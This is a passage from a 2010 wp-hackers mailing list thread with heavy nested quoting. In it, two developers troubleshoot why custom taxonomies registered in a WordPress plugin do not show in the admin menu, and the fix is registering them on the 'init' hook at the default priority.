>> On Jul 31, 2010, at 3:44 PM, Mike Schinkel wrote:
>> 
>>> Can you post your register_taxonomy() code?
>>> 
>>> On Jul 31, 2010, at 6:40 PM, Joshua Sibelman wrote:
>>> 
>>>> I'm registering the taxonomies on init, like so:
>>>> add_action('admin_init', array($this, 'createListingTaxonomies'), 0);
>>>> 
>>>> 
>>>> On Jul 31, 2010, at 3:22 PM, Mike Schinkel wrote:
>>>> 
>>>>> In the plugin are you doing it in the global area of the .PHP file on in an init hook?
>>>>> 
>>>>> -Mike
>>>>> 
>>>>> On Jul 31, 2010, at 5:52 PM, Joshua Sibelman wrote:
>>>>> 
>>>>>> I hope this isn't an obvious question, but I wasn't able to find anything on this in the Codex.
>>>>>> 
>>>>>> I created a plugin for a client that registers a new post type with two attendant hierarchical taxonomies. When the taxonomies are registered via the plugin, I do not see line items in the admin menu to access them for editing. If I move the taxonomy registration out of the plugin and into the theme's functions.php file, then the menu items appear.
>>>>>> 
>>>>>> Can anyone explain this behavior? Is there something specific I need to do when registering taxonomies via plugin vs. the functions.php file to get the menus to appear?
>>>>>> 
>>>>>> Thanks for any help you can give me.
>>>>>> 
>>>>>> Josh
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Sat Jul 31 23:06:03 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 31 Jul 2010 19:06:03 -0400
Subject: [wp-hackers] Custom taxonomies and admin menus
In-Reply-To: <7F7B49E9-EF4D-44CA-8257-8C2CC35BC768@gmail.com>
References: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>
	<E118293A-4ED8-474D-88CE-E3FB1B211FE9@newclarity.net>
	<F5C092FD-E485-4D21-84D7-2B458300EC0F@gmail.com>
	<0BC4B936-E192-43D1-9862-3477B3527C07@newclarity.net>
	<E1610753-E89A-4A8B-9380-8CF43E039D2D@gmail.com>
	<8BEA8134-619D-49DC-A051-9342FBDBDA12@newclarity.net>
	<7F7B49E9-EF4D-44CA-8257-8C2CC35BC768@gmail.com>
Message-ID: <7A7CD5B7-EBCB-4A64-830F-828FBFECA571@newclarity.net>

Is your register_post('listing',...) also in an 'init' hook vs. an 'admin_init' hook?

When I took your code it didn't show up in the menu until I changed it to 'init'.  I had to add a register_post() for 'listing', of course.  Here's what it looks like (for testing purposes, of course.) Is yours have public and show_ui set to true?:

 register_post_type('listing',array(
    'label' => 'Listings',
    'public' => true,
    'publicly_queryable' => true,
    'show_ui' => true,
    'query_var' => true,
    'rewrite' => true,
    'capability_type' => 'post',
    'hierarchical' => false,
    'supports' => array('title')
  ));

This is what the admin screen  looks like with your code in an init hook in a (mostly) clean copy of WordPress 3.0.1:

http://mikeschinkel.com/websnaps/skitched-20100731-190500.png

-Mike

On Jul 31, 2010, at 6:59 PM, Joshua Sibelman wrote:

> I have. It makes no difference.
> 
> 
> On Jul 31, 2010, at 3:56 PM, Mike Schinkel wrote:
> 
>> Hi Joshua :
>> 
>> Try this instead:
>> 
>> add_action('init', array($this, 'createListingTaxonomies'), 0);
>> 
>> -Mike
>> 
>> On Jul 31, 2010, at 6:47 PM, Joshua Sibelman wrote:
>> 
>>> http://pastebin.com/App1td55
>>> 
>>> Thanks for checking it out.
>>> 
>>> 
>>> 
>>> On Jul 31, 2010, at 3:44 PM, Mike Schinkel wrote:
>>> 
>>>> Can you post your register_taxonomy() code?
>>>> 
>>>> On Jul 31, 2010, at 6:40 PM, Joshua Sibelman wrote:
>>>> 
>>>>> I'm registering the taxonomies on init, like so:
>>>>> add_action('admin_init', array($this, 'createListingTaxonomies'), 0);
>>>>> 
>>>>> 
>>>>> On Jul 31, 2010, at 3:22 PM, Mike Schinkel wrote:
>>>>> 
>>>>>> In the plugin are you doing it in the global area of the .PHP file on in an init hook?
>>>>>> 
>>>>>> -Mike
>>>>>> 
>>>>>> On Jul 31, 2010, at 5:52 PM, Joshua Sibelman wrote:
>>>>>> 
>>>>>>> I hope this isn't an obvious question, but I wasn't able to find anything on this in the Codex.
>>>>>>> 
>>>>>>> I created a plugin for a client that registers a new post type with two attendant hierarchical taxonomies. When the taxonomies are registered via the plugin, I do not see line items in the admin menu to access them for editing. If I move the taxonomy registration out of the plugin and into the theme's functions.php file, then the menu items appear.
>>>>>>> 
>>>>>>> Can anyone explain this behavior? Is there something specific I need to do when registering taxonomies via plugin vs. the functions.php file to get the menus to appear?
>>>>>>> 
>>>>>>> Thanks for any help you can give me.
>>>>>>> 
>>>>>>> Josh
>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From joshua.sibelman at gmail.com  Sat Jul 31 23:28:30 2010
From: joshua.sibelman at gmail.com (Joshua Sibelman)
Date: Sat, 31 Jul 2010 16:28:30 -0700
Subject: [wp-hackers] Custom taxonomies and admin menus
In-Reply-To: <7A7CD5B7-EBCB-4A64-830F-828FBFECA571@newclarity.net>
References: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>
	<E118293A-4ED8-474D-88CE-E3FB1B211FE9@newclarity.net>
	<F5C092FD-E485-4D21-84D7-2B458300EC0F@gmail.com>
	<0BC4B936-E192-43D1-9862-3477B3527C07@newclarity.net>
	<E1610753-E89A-4A8B-9380-8CF43E039D2D@gmail.com>
	<8BEA8134-619D-49DC-A051-9342FBDBDA12@newclarity.net>
	<7F7B49E9-EF4D-44CA-8257-8C2CC35BC768@gmail.com>
	<7A7CD5B7-EBCB-4A64-830F-828FBFECA571@newclarity.net>
Message-ID: <32526067-0F3F-4E84-AA46-22AC397031D4@gmail.com>

Thanks for the help Mike.

I managed to get them to show up by both changing them to the init() hook, but also by changing their priority from 0 to 10, and invoking this hook immediately after registering the post type.

It's unclear to me *why* that solved the problem, but it did. I appreciate the assistance.




On Jul 31, 2010, at 4:06 PM, Mike Schinkel wrote:

> Is your register_post('listing',...) also in an 'init' hook vs. an 'admin_init' hook?
> 
> When I took your code it didn't show up in the menu until I changed it to 'init'.  I had to add a register_post() for 'listing', of course.  Here's what it looks like (for testing purposes, of course.) Is yours have public and show_ui set to true?:
> 
> register_post_type('listing',array(
>    'label' => 'Listings',
>    'public' => true,
>    'publicly_queryable' => true,
>    'show_ui' => true,
>    'query_var' => true,
>    'rewrite' => true,
>    'capability_type' => 'post',
>    'hierarchical' => false,
>    'supports' => array('title')
>  ));
> 
> This is what the admin screen  looks like with your code in an init hook in a (mostly) clean copy of WordPress 3.0.1:
> 
> http://mikeschinkel.com/websnaps/skitched-20100731-190500.png
> 
> -Mike
> 
> On Jul 31, 2010, at 6:59 PM, Joshua Sibelman wrote:
> 
>> I have. It makes no difference.
>> 
>> 
>> On Jul 31, 2010, at 3:56 PM, Mike Schinkel wrote:
>> 
>>> Hi Joshua :
>>> 
>>> Try this instead:
>>> 
>>> add_action('init', array($this, 'createListingTaxonomies'), 0);
>>> 
>>> -Mike
>>> 
>>> On Jul 31, 2010, at 6:47 PM, Joshua Sibelman wrote:
>>> 
>>>> http://pastebin.com/App1td55
>>>> 
>>>> Thanks for checking it out.
>>>> 
>>>> 
>>>> 
>>>> On Jul 31, 2010, at 3:44 PM, Mike Schinkel wrote:
>>>> 
>>>>> Can you post your register_taxonomy() code?
>>>>> 
>>>>> On Jul 31, 2010, at 6:40 PM, Joshua Sibelman wrote:
>>>>> 
>>>>>> I'm registering the taxonomies on init, like so:
>>>>>> add_action('admin_init', array($this, 'createListingTaxonomies'), 0);
>>>>>> 
>>>>>> 
>>>>>> On Jul 31, 2010, at 3:22 PM, Mike Schinkel wrote:
>>>>>> 
>>>>>>> In the plugin are you doing it in the global area of the .PHP file on in an init hook?
>>>>>>> 
>>>>>>> -Mike
>>>>>>> 
>>>>>>> On Jul 31, 2010, at 5:52 PM, Joshua Sibelman wrote:
>>>>>>> 
>>>>>>>> I hope this isn't an obvious question, but I wasn't able to find anything on this in the Codex.
>>>>>>>> 
>>>>>>>> I created a plugin for a client that registers a new post type with two attendant hierarchical taxonomies. When the taxonomies are registered via the plugin, I do not see line items in the admin menu to access them for editing. If I move the taxonomy registration out of the plugin and into the theme's functions.php file, then the menu items appear.
>>>>>>>> 
>>>>>>>> Can anyone explain this behavior? Is there something specific I need to do when registering taxonomies via plugin vs. the functions.php file to get the menus to appear?
>>>>>>>> 
>>>>>>>> Thanks for any help you can give me.
>>>>>>>> 
>>>>>>>> Josh
>>>>> 
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Sat Jul 31 23:31:13 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 31 Jul 2010 19:31:13 -0400
Subject: [wp-hackers] Custom taxonomies and admin menus
In-Reply-To: <32526067-0F3F-4E84-AA46-22AC397031D4@gmail.com>
References: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>
	<E118293A-4ED8-474D-88CE-E3FB1B211FE9@newclarity.net>
	<F5C092FD-E485-4D21-84D7-2B458300EC0F@gmail.com>
	<0BC4B936-E192-43D1-9862-3477B3527C07@newclarity.net>
	<E1610753-E89A-4A8B-9380-8CF43E039D2D@gmail.com>
	<8BEA8134-619D-49DC-A051-9342FBDBDA12@newclarity.net>
	<7F7B49E9-EF4D-44CA-8257-8C2CC35BC768@gmail.com>
	<7A7CD5B7-EBCB-4A64-830F-828FBFECA571@newclarity.net>
	<32526067-0F3F-4E84-AA46-22AC397031D4@gmail.com>
Message-ID: <7FFF19F9-43A9-4D00-81BA-4617C26E1C3F@newclarity.net>

> I managed to get them to show up by both changing them to the init() hook, but also by changing their priority from 0 to 10, and invoking this hook immediately after registering the post type.

Actually, I change the priority too, forgot to mention that.  

Yeah, always accept the default or use "10" unless you've got a specific reason to have a different priority.

-Mike

On Jul 31, 2010, at 7:28 PM, Joshua Sibelman wrote:

> Thanks for the help Mike.
> 
> I managed to get them to show up by both changing them to the init() hook, but also by changing their priority from 0 to 10, and invoking this hook immediately after registering the post type.
> 
> It's unclear to me *why* that solved the problem, but it did. I appreciate the assistance.
> 
> 
> 
> 
> On Jul 31, 2010, at 4:06 PM, Mike Schinkel wrote:
> 
>> Is your register_post('listing',...) also in an 'init' hook vs. an 'admin_init' hook?
>> 
>> When I took your code it didn't show up in the menu until I changed it to 'init'.  I had to add a register_post() for 'listing', of course.  Here's what it looks like (for testing purposes, of course.) Is yours have public and show_ui set to true?:
>> 
>> register_post_type('listing',array(
>>   'label' => 'Listings',
>>   'public' => true,
>>   'publicly_queryable' => true,
>>   'show_ui' => true,
>>   'query_var' => true,
>>   'rewrite' => true,
>>   'capability_type' => 'post',
>>   'hierarchical' => false,
>>   'supports' => array('title')
>> ));
>> 
>> This is what the admin screen  looks like with your code in an init hook in a (mostly) clean copy of WordPress 3.0.1:
>> 
>> http://mikeschinkel.com/websnaps/skitched-20100731-190500.png
>> 
>> -Mike
>> 
>> On Jul 31, 2010, at 6:59 PM, Joshua Sibelman wrote:
>> 
>>> I have. It makes no difference.
>>> 
>>> 
>>> On Jul 31, 2010, at 3:56 PM, Mike Schinkel wrote:
>>> 
>>>> Hi Joshua :
>>>> 
>>>> Try this instead:
>>>> 
>>>> add_action('init', array($this, 'createListingTaxonomies'), 0);
>>>> 
>>>> -Mike
>>>> 
>>>> On Jul 31, 2010, at 6:47 PM, Joshua Sibelman wrote:
>>>> 
>>>>> http://pastebin.com/App1td55
>>>>> 
>>>>> Thanks for checking it out.
>>>>> 
>>>>> 
>>>>> 
>>>>> On Jul 31, 2010, at 3:44 PM, Mike Schinkel wrote:
>>>>> 
>>>>>> Can you post your register_taxonomy() code?
>>>>>> 
>>>>>> On Jul 31, 2010, at 6:40 PM, Joshua Sibelman wrote:
>>>>>> 
>>>>>>> I'm registering the taxonomies on init, like so:
>>>>>>> add_action('admin_init', array($this, 'createListingTaxonomies'), 0);
>>>>>>> 
>>>>>>> 
>>>>>>> On Jul 31, 2010, at 3:22 PM, Mike Schinkel wrote:
>>>>>>> 
>>>>>>>> In the plugin are you doing it in the global area of the .PHP file on in an init hook?
>>>>>>>> 
>>>>>>>> -Mike
>>>>>>>> 
>>>>>>>> On Jul 31, 2010, at 5:52 PM, Joshua Sibelman wrote:
>>>>>>>> 
>>>>>>>>> I hope this isn't an obvious question, but I wasn't able to find anything on this in the Codex.
>>>>>>>>> 
>>>>>>>>> I created a plugin for a client that registers a new post type with two attendant hierarchical taxonomies. When the taxonomies are registered via the plugin, I do not see line items in the admin menu to access them for editing. If I move the taxonomy registration out of the plugin and into the theme's functions.php file, then the menu items appear.
>>>>>>>>> 
>>>>>>>>> Can anyone explain this behavior? Is there something specific I need to do when registering taxonomies via plugin vs. the functions.php file to get the menus to appear?
>>>>>>>>> 
>>>>>>>>> Thanks for any help you can give me.
>>>>>>>>> 
>>>>>>>>> Josh
>>>>>> 
>>>>>> _______________________________________________
>>>>>> wp-hackers mailing list
>>>>>> wp-hackers at lists.automattic.com
>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>> 
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


